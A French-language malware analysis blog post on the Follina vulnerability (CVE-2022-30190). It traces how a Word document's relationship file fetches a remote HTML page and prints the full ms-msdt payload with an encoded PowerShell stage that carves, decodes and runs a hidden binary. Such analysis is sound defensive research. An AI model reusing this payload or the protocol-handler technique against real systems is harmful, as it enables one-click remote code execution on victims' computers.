---
title: "CVE-2022-30190 \"Follina\" - part 1"
date: 2022-07-01
author: "Hugo Contributors"
---






## # Billet 1



### **TL-DR;**

Le 27 mai 2022 [@nao-sec](https://twitter.com/nao_sec) découvre pendant le reverse hunting sur VirusTotal un fichier Word mis en ligne depuis la Biélorussie, intitulé "**05-2022-0438.doc**"( [06727ffda60359236a8029e0b3e8a0fd11c23313](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784) ).

Après avoir procédé a l'analyse de celui-ci Kevin Beaumont  découvre un vecteur d'attaque inconnu qui abuse du composant [msdt](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msdt) (Microsoft Support Diagnostic Tool) afin d'obtenir l'exécution du code arbitraire. Il qualifiera la vunérabilité comme étant un 0-Day et il lui donnera le nom de "Follina" d'après le nom d'un commune italienne de Trévise.

Le 30 mai 2022 Microsoft attribue l'identificateur **CVE-2022-30190** à la vulnérabilité en y publient des [correctifs](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190) le 14 juin 2022. 

Plusieurs démonstrateurs sortis rapidement confirment l'exploitabilité de cette faille tout en découvrant d'autres vecteurs d'attaque inédits. A partir de là des rapports font état de l'identification de plusieurs exploits armés, attribués à des acteurs malveillants connus.



## 	**1.Analyse de l'exploit initial**

Le triage initial du document confirme qu'il s'agit d'un document MS Word 2007+ pouvant être traîté comme une archive zip :

![](/img/img1.png)



![](/img/img2.png)




Après l'extraction du contenu on obtient l'aborescence suivante :

![](/img/img3.png)




D'un interêt particulier est le fichier "**document.xml.rels**" - fichier XML qui met en correspondance les relations au sein du fichier . docx (entre les tables de polices, les paramètres du document, les commentaires, les notes de bas de page, les définitions de style, les définitions de numérotation) avec les ressources externes a celui-ci, telles que des URL et des images.

A l'ouverture de celui-ci on remarque parmi les URLs légitimes l'appel vers un URL suspicieux :

![](/img/img4.png)



En effet, à l"ouverture du fichier l'URL suivant chargera la ressouce HTML externe **RDF8421.html** ([92661e88ed93b873857741dfae58e08da6c3e312](https://www.virustotal.com/gui/file/764a57c926711e448e68917e7db5caba988d3cdbc656b00cd3a6e88922c63837)):

​                    hxxps://www\[.\]xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html! 

La téchnique par laquelle les adversaires peuvent faire passer des données et des fichiers à travers les filtres de contenu en cachant les charges malveillantes dans des fichiers HTML apparemment inoffensifs est appelé **contrebande HTML** ([HTML smuggling](https://attack.mitre.org/techniques/T1027/006/)).

Le document HTML téléchargé commence par une balise <script> et comprend une quantité importante de caractères "A" commentés, qui (étant donné qu'il ne s'agit que de commentaires), semblent ne servir à rien. Il se trouve qu'il s'agit du remplissage ("padding") du code, une quantité importante de caractères nécessaire pour que l'exploit fonctionne (4096 octets).

En bas de la page on trouve l'expression suivante :

![](/img/img5.png)

Voici la logique d'execution de l'exploit :

```
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
```

**ms-msdt**: est le shéma ou le géstionnaire de protocole ("*protocol handler*"). Son rôle est de permettre l'accès à une resource dans son format natif - dans notre cas à l'invocation du binaire natif **msdt.exe**, avec les paramètres  **IT_BrowseForFile** qui incluent de la syntaxe PowerShell embarquée et encodée dans un blob **base64**. Détourner le fonctionnement des binaires "officiels" d'un système est appelé "*living off the land*" (LOLBINS).

L'abus des gestionnaires de protocole MS Office à été amplement [docummenté](https://blog.syss.com/posts/abusing-ms-office-protos/) auparavant mais jamais observé dans des cas réels d'exploitation ("*in the wild - ITW*").

Une fois le blob en base64 décodé on obtient le code suivant :

![](/img/img6.png)

Les étapes d'execution observées sont comme suit :

- capture du cmd.exe dans une variable
- démarrage avec une fenêtre cachée pour
  - tuer **msdt.exe** s'il est en exécution
  - balayer les fichiers présents dans **05-2022-0438.rar** à la recherche de la chaîne de caractères "TVNDRgAAAA" qui correspond,après le décodage base64,à la signature [MSCF](https://www.file-recovery.com/cab-signature-format.htm) du format de fichier .cab
  - stocker ce fichier .cab en tant que **1.t**
  - decoder celui-ci (base64) à l'aide de **certutil** et le sauvgarder en tant que **1.c**
  - extraire le fichier .cab **1.c** dans le répertoire d'execution
  - executer le binaire **rgb.exe** qui s'y trouve

Le fait d'utiliser le format **Microsoft cabinet** (.cab) a du sens car c'est le format sous lequel msdt.exe va archiver le paquets de diagnostique qu'il envoie au support pour depannage.

L'impact de son'exécution n'est pas connu (car le binaire rgb.exe n'a pas pu être récuperé) mais le chemin d'execution peut resembler à ceci :

![](/img/img8.png)

Par conséquent on peut inférer quelques **conclusions** :

a)	L'utilisation d'une même nom pour le document malicieux ("*maldoc*") comme pour l'archive .rar initiale laisse supposer que le vecteur d'attaque correspond à l'archive .rar probablement expedié en tant que pièce jointe dans une **campagne de phishing**.

b)	La nouvelle technique d'accès initial qui permet aux acteurs malicieux d'exécuter du code **en un seul clic** ( *"1-click RCE"*) à été implémenté pour contourner le blocage des macros MS Office [annoncé par Microsoft](https://docs.microsoft.com/en-us/deployoffice/security/internet-macros-blocked) au début de l'année. 

c)	Une recherche par similarité sur VirusTotal nous perment de conclure qu'il ne s'agit pas d'un échantion isolée mais d'un élement appartenant à une [**campagne de plus large envergure**](https://www.virustotal.com/graph/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784)

 ![](/img/img7.png)



d)	Enfin, l'hypotèse concernant l'utilisation de cette technique dans des **campagnes ciblées** est supporté par le fait que, suite au recherches, des échantillons datant du mois d'avril et même de [2021](https://www.fortinet.com/blog/threat-research/analysis-of-follina-zero-day) en provenance de la Russie et [de la Chine](https://blog.sekoia.io/msdt-abused-to-achieve-rce-on-microsoft-office/) ont été également documentés. 

e)	Etant donné qu'il existent de nombreux autres gestionnaires de protocoles ( tel que skype:/ ms-site:/ ou ms-teams:/) on peut supposer que la surface d'attaque est [potentiellement considérable](https://0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com/site/zerodayresearch/Moniker_Magic_final.pdf?attachauth=ANoY7cqxRlTAB3hf0PuH1QM3YyM1OB4L9uzEWYItg6GK8ULyvASPgXX4u62oeWKn1u43hVL4wPZGhwUu8s5vbT5GevRASdGTxlKWbN9GiZBEh_z1Rk7cZ1CygDGASM-G_hHfj-rUwb3cEvHNS6s01hC0zKJbsK_28GOSWYS0bR38QbT_ZBLg83X94mlv8_IC679m7U85W9voH9kmoGxCYHA2IDgRDHs-hd1E_ltJJ161_M-DnC6lT1E%3D&attredirects=0). On peut donc s'attendre à des **nouveaux vecteurs d'attaque** exploitables dans le futur. 



A suivre...









